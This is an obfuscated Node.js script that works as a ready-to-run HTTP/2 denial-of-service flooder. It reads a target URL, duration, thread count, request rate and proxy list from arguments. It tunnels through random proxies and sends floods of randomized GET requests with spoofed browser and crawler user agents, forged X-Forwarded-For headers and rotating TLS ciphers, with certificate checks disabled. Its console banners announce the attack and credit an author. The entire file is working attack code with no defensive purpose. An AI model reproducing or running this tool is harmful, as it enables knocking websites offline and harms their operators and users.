const _0x5986d9=_0x2465;(function(_0x160840,_0x5d1caf){const _0x3fe5e6=_0x2465,_0x4bd681=_0x160840();while(!![]){try{const _0xa17491=parseInt(_0x3fe5e6(0xe4))/0x1+parseInt(_0x3fe5e6(0x109))/0x2*(-parseInt(_0x3fe5e6(0xd9))/0x3)+-parseInt(_0x3fe5e6(0xf8))/0x4*(-parseInt(_0x3fe5e6(0x11c))/0x5)+-parseInt(_0x3fe5e6(0xde))/0x6*(parseInt(_0x3fe5e6(0xd3))/0x7)+parseInt(_0x3fe5e6(0x12a))/0x8+-parseInt(_0x3fe5e6(0xef))/0x9+-parseInt(_0x3fe5e6(0xd8))/0xa;if(_0xa17491===_0x5d1caf)break;else _0x4bd681['push'](_0x4bd681['shift']());}catch(_0x17a7db){_0x4bd681['push'](_0x4bd681['shift']());}}}(_0x4fa4,0x2cea8));const url=require(_0x5986d9(0xf2)),fs=require('fs'),http2=require(_0x5986d9(0x12e)),http=require(_0x5986d9(0xf9)),tls=require(_0x5986d9(0x11e)),net=require('net'),cluster=require(_0x5986d9(0xe2)),randstr=require('randomstring');fakeua=require(_0x5986d9(0xdc)),cplist=[_0x5986d9(0xf5),_0x5986d9(0xbf),_0x5986d9(0xc1),_0x5986d9(0xbd),'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',_0x5986d9(0xf4),_0x5986d9(0xd7),_0x5986d9(0xb8),'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5','HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'],accept_header=[_0x5986d9(0x127),_0x5986d9(0x110),_0x5986d9(0xd6),'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'],lang_header=[_0x5986d9(0xc2),_0x5986d9(0xea),_0x5986d9(0x121),'en-US,en;q=0.9','de-CH;q=0.7',_0x5986d9(0xfb),_0x5986d9(0x128)],encoding_header=[_0x5986d9(0xba),'gzip,\x20deflate,\x20br','*'],controle_header=[_0x5986d9(0xf0),'no-store',_0x5986d9(0xc0),_0x5986d9(0x108),_0x5986d9(0x104)],useragent_header=[_0x5986d9(0xfc),'Mozilla/5.0\x20(X11;\x20Linux\x20x86_64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20HeadlessChrome/85.0.4183.121\x20Safari/537.36\x20(compatible;\x20Cloudflare\x20SpeedTest/1.0;\x20+https://blog.cloudflare.com/new-speed-page/)',_0x5986d9(0x120),'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/100.0.4896.127\x20Safari/537.36',_0x5986d9(0x10e),_0x5986d9(0xb6),_0x5986d9(0xc5),_0x5986d9(0x112),_0x5986d9(0x123),_0x5986d9(0xcb)],ignoreNames=[_0x5986d9(0xd4),_0x5986d9(0xed),_0x5986d9(0xf7),_0x5986d9(0x116),'ParseError',_0x5986d9(0x111)],ignoreCodes=[_0x5986d9(0xdf),_0x5986d9(0xcf),_0x5986d9(0x114),_0x5986d9(0xc8),'EPIPE',_0x5986d9(0xfa),_0x5986d9(0x115),_0x5986d9(0x11d),'EPROTO'],process['on'](_0x5986d9(0x12f),function(_0x8ac447){})['on'](_0x5986d9(0xdd),function(_0x189f76){})['on'](_0x5986d9(0x113),_0x44fa9e=>{})[_0x5986d9(0x102)](0x0);function accept(){const _0x43ac59=_0x5986d9;return accept_header[Math[_0x43ac59(0x122)](Math['random']()*accept_header[_0x43ac59(0xe3)])];}function lang(){const _0xbd6691=_0x5986d9;return lang_header[Math[_0xbd6691(0x122)](Math[_0xbd6691(0xe1)]()*lang_header['length'])];}function _0x4fa4(){const _0x3ebd53=['Target:\x20','Mozilla','setMaxListeners','en-US','max-age=0','fr-FR','Chrome','clear','only-if-cached','40772vEBpLF','data','response','readFileSync','Windows\x20NT\x2010.0','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/98.0.4758.109\x20Safari/537.36\x20OPR/84.0.4316.50','setEncoding','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','ParserError','Mozilla/5.0\x20(compatible;\x20AhrefsBot/7.0;\x20+http://ahrefs.com/robot/)','warning','ERR_ASSERTION','ETIMEDOUT','CloudflareError','utf8','log','isMaster','Windows\x20NT\x206.1','TLS_method','15pthpEX','ESOCKETTIMEDOUT','tls','exit','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/102.0.5005.63\x20Safari/537.36','en-US,en;q=0.5','floor','Mozilla/5.0\x20(compatible;\x20Discordbot/2.0;\x20+https://discordapp.com)','Keep-Alive','close','setSocketKeepAlive','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','cs;q=0.5','toUpperCase','1440944nIxKuR','Linux','?Yasuo=%RAND%?%RAND%','\x1b[38;2;255;0;255mScript\x20By\x20SOSph','http2','uncaughtException','split','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/100.0.4896.127\x20Safari/537.36\x20OPR/86.0.4363.64','0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789','AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL','\x1b[0m','deflate,\x20gzip;q=1.0,\x20*;q=0.5','utf-8','Edge','ECDHE-ECDSA-AES128-GCM-SHA256','host','EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH','no-transform','EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH','he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7','argv','Apple','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/99.0.4844.74\x20Safari/537.36\x20Edg/99.0.1150.52','path','Agent','ECONNREFUSED','connect','charAt','Mozilla/5.0\x20(Linux;\x20Android\x206.0.1;\x20Nexus\x205X\x20Build/MMB29P)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/96.0.4664.45\x20Mobile\x20Safari/537.36\x20(compatible;\x20Googlebot/2.1;\x20+http://www.google.com/bot.html)','1.3','\x1b[38;2;129;126;255m','CONNECT','ECONNRESET','toString','\x1b[1m','href','2086KDUzFV','RequestError','Safari','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH','2100570yNaLkt','36zRycnd','end','GET','fake-useragent','unhandledRejection','972KpiiWD','SELF_SIGNED_CERT_IN_CHAIN','\x20proxies\x20to\x20the\x20website.','random','cluster','length','298300pbxLic','Windows\x20NT\x206.3','match','Firefox',':443','generate','fr-CH,\x20fr;q=0.9,\x20en;q=0.8,\x20de;q=0.7,\x20*;q=0.5','parse','Macintosh','StatusCodeError','1.2','86598CqWacJ','no-cache','Android','url','\x1b[38;2;255;0;255mAttack\x20sent\x20all\x20','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH','Microsoft','CaptchaError','290860dFNWpw','http','EHOSTUNREACH','da,\x20en-gb;q=0.8,\x20en;q=0.7','Mozilla/5.0\x20(compatible;\x20Googlebot/2.1;\x20+http://www.google.com/bot.html)','Requests\x20per\x20second:\x20','Opera','en-GB'];_0x4fa4=function(){return _0x3ebd53;};return _0x4fa4();}function useragent(){const _0x5450e6=_0x5986d9;return useragent_header[Math[_0x5450e6(0x122)](Math[_0x5450e6(0xe1)]()*useragent_header[_0x5450e6(0xe3)])];}function encoding(){const _0x32b573=_0x5986d9;return encoding_header[Math['floor'](Math[_0x32b573(0xe1)]()*encoding_header[_0x32b573(0xe3)])];}function controling(){const _0x812c70=_0x5986d9;return controle_header[Math['floor'](Math[_0x812c70(0xe1)]()*controle_header[_0x812c70(0xe3)])];}function cipher(){const _0x49331f=_0x5986d9;return cplist[Math['floor'](Math[_0x49331f(0xe1)]()*cplist['length'])];}function ra(_0x217413){const _0x101f4b=_0x5986d9,_0x4f94b4=randstr[_0x101f4b(0xe9)]({'charset':_0x101f4b(0xb7),'length':_0x217413});return _0x4f94b4;}function ra1(){const _0x235b9e=_0x5986d9,_0x41592c=randstr[_0x235b9e(0xe9)]({'charset':_0x235b9e(0xb7),'length':0x19});return _0x41592c;}function ra2(){const _0x170dac=_0x5986d9,_0x1a91ea=randstr['generate']({'charset':_0x170dac(0xb7),'length':0x19});return _0x1a91ea;}function ra3(){const _0x260644=_0x5986d9,_0x4b706e=randstr[_0x260644(0xe9)]({'charset':'0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789','length':0x19});return _0x4b706e;}function ra4(){const _0x430ade=_0x5986d9,_0x5ba516=randstr['generate']({'charset':_0x430ade(0xb7),'length':0x19});return _0x5ba516;}function getRandomUserAgent(){const _0x546354=_0x5986d9,_0x3bb3bd=[_0x546354(0x10d),_0x546354(0x11a),_0x546354(0xe5),_0x546354(0xec),_0x546354(0xf1),_0x546354(0x12b)],_0x46dd8a=[_0x546354(0x106),_0x546354(0xe7),_0x546354(0xd5),_0x546354(0xbc),_0x546354(0xfe)],_0x157b20=[_0x546354(0x103),_0x546354(0xff),_0x546354(0x105),'de-DE','es-ES'],_0x24174a=['US','GB','FR','DE','ES'],_0xb73cd=[_0x546354(0xc4),'Google',_0x546354(0xf6),_0x546354(0x101),'Opera\x20Software'],_0x16fe87=_0x3bb3bd[Math[_0x546354(0x122)](Math[_0x546354(0xe1)]()*_0x3bb3bd[_0x546354(0xe3)])],_0x4d3c9f=_0x46dd8a[Math[_0x546354(0x122)](Math[_0x546354(0xe1)]()*_0x46dd8a[_0x546354(0xe3)])],_0x9cd4f6=_0x157b20[Math[_0x546354(0x122)](Math[_0x546354(0xe1)]()*_0x157b20[_0x546354(0xe3)])],_0x1fb2ad=_0x24174a[Math[_0x546354(0x122)](Math[_0x546354(0xe1)]()*_0x24174a[_0x546354(0xe3)])],_0x4ba35c=_0xb73cd[Math[_0x546354(0x122)](Math[_0x546354(0xe1)]()*_0xb73cd[_0x546354(0xe3)])],_0x1aa8a8=Math['floor'](Math['random']()*0x64)+0x1,_0x3fd34f=Math[_0x546354(0x122)](Math[_0x546354(0xe1)]()*0x6)+0x1,_0x530ab8=_0x4ba35c+'/'+_0x4d3c9f+'\x20'+_0x1aa8a8+'.'+_0x1aa8a8+'.'+_0x1aa8a8+'\x20('+_0x16fe87+';\x20'+_0x1fb2ad+';\x20'+_0x9cd4f6+')',_0x37e47a=btoa(_0x530ab8);let _0x252d2d='';for(let _0x3b4d33=0x0;_0x3b4d33<_0x37e47a[_0x546354(0xe3)];_0x3b4d33++){_0x3b4d33%_0x3fd34f===0x0?_0x252d2d+=_0x37e47a[_0x546354(0xca)](_0x3b4d33):_0x252d2d+=_0x37e47a[_0x546354(0xca)](_0x3b4d33)[_0x546354(0x129)]();}return _0x252d2d;}const target=process[_0x5986d9(0xc3)][0x2],time=process[_0x5986d9(0xc3)][0x3],thread=process[_0x5986d9(0xc3)][0x4],rps=process[_0x5986d9(0xc3)][0x5],proxys=fs[_0x5986d9(0x10c)](process[_0x5986d9(0xc3)][0x6],_0x5986d9(0xbb))[_0x5986d9(0xd0)]()[_0x5986d9(0xe6)](/\S+/g);function proxyr(){const _0x4eb6c3=_0x5986d9;return proxys[Math[_0x4eb6c3(0x122)](Math['random']()*proxys['length'])];}function _0x2465(_0x112e8a,_0x4eee23){const _0x4fa44a=_0x4fa4();return _0x2465=function(_0x246526,_0x39a8c4){_0x246526=_0x246526-0xb6;let _0x5aa870=_0x4fa44a[_0x246526];return _0x5aa870;},_0x2465(_0x112e8a,_0x4eee23);}if(cluster[_0x5986d9(0x119)]){const dateObj=new Date();console[_0x5986d9(0x107)](),console['log'](_0x5986d9(0xcd)+_0x5986d9(0x100)+_0x5986d9(0xb9)+_0x5986d9(0xd1)+target+_0x5986d9(0xb9)),console[_0x5986d9(0x118)]('\x1b[38;2;129;126;255m'+'Duration:\x20'+_0x5986d9(0xb9)+_0x5986d9(0xd1)+time+_0x5986d9(0xb9)),console[_0x5986d9(0x118)](_0x5986d9(0xcd)+'Threads:\x20'+_0x5986d9(0xb9)+_0x5986d9(0xd1)+thread+_0x5986d9(0xb9)),console[_0x5986d9(0x118)](_0x5986d9(0xcd)+_0x5986d9(0xfd)+_0x5986d9(0xb9)+_0x5986d9(0xd1)+0xc8+_0x5986d9(0xb9)),console[_0x5986d9(0x118)](_0x5986d9(0xf3)+proxys[_0x5986d9(0xe3)]+_0x5986d9(0xe0)),console[_0x5986d9(0x118)](_0x5986d9(0x12d));for(var bb=0x0;bb<thread;bb++){cluster['fork']();}setTimeout(()=>{const _0x3542b2=_0x5986d9;process[_0x3542b2(0x11f)](-0x1);},time*0x3e8);}else{function flood(){const _0x383c66=_0x5986d9;var _0x37cf73=url[_0x383c66(0xeb)](target);const _0x510573=useragent();var _0xb004f2=cipher(),_0x440826=proxyr()[_0x383c66(0x130)](':'),_0x232558={':path':_0x37cf73[_0x383c66(0xc6)]+'?'+ra1()+'?'+ra2()+'?'+ra3()+'?'+ra4()+_0x383c66(0x12c),'X-Forwarded-For':_0x440826[0x0],'X-Forwarded-Host':_0x440826[0x0],':method':_0x383c66(0xdb),'User-agent':_0x510573,'Origin':target,'Accept':accept(),'Accept-Encoding':encoding(),'Accept-Language':lang(),'Cache-Control':controling()};const _0x53ab12=new http[(_0x383c66(0xc7))]({'keepAlive':!![],'keepAliveMsecs':0x4e20,'maxSockets':0x0});var _0x3006d5=http['request']({'host':_0x440826[0x0],'agent':_0x53ab12,'globalAgent':_0x53ab12,'port':_0x440826[0x1],'headers':{'Host':_0x37cf73[_0x383c66(0xbe)],'Proxy-Connection':_0x383c66(0x124),'Connection':'Keep-Alive'},'method':_0x383c66(0xce),'path':_0x37cf73[_0x383c66(0xbe)]+_0x383c66(0xe8)},function(){const _0x11eaa6=_0x383c66;_0x3006d5[_0x11eaa6(0x126)](!![]);});_0x3006d5['on']('connect',function(_0x35dcff,_0x32dc9,_0x2e5023){const _0xf055f1=_0x383c66,_0x36d369=http2[_0xf055f1(0xc9)](_0x37cf73[_0xf055f1(0xd2)],{'createConnection':()=>tls[_0xf055f1(0xc9)]({'host':_0x37cf73[_0xf055f1(0xbe)],'ciphers':_0xb004f2,'secureProtocol':_0xf055f1(0x11b),'TLS_MIN_VERSION':_0xf055f1(0xee),'TLS_MAX_VERSION':_0xf055f1(0xcc),'servername':_0x37cf73[_0xf055f1(0xbe)],'secure':!![],'rejectUnauthorized':![],'ALPNProtocols':['h2'],'socket':_0x32dc9},function(){const _0x1bb8fb=_0xf055f1;for(let _0xc98743=0x0;_0xc98743<rps;_0xc98743++){const _0x266d61=_0x36d369['request'](_0x232558);_0x266d61[_0x1bb8fb(0x10f)](_0x1bb8fb(0x117)),_0x266d61['on'](_0x1bb8fb(0x10a),_0x354fdf=>{}),_0x266d61['on'](_0x1bb8fb(0x10b),()=>{const _0x2494e5=_0x1bb8fb;_0x266d61[_0x2494e5(0x125)]();}),_0x266d61['end']();}})});}),_0x3006d5[_0x383c66(0xda)]();}setInterval(()=>{flood();});}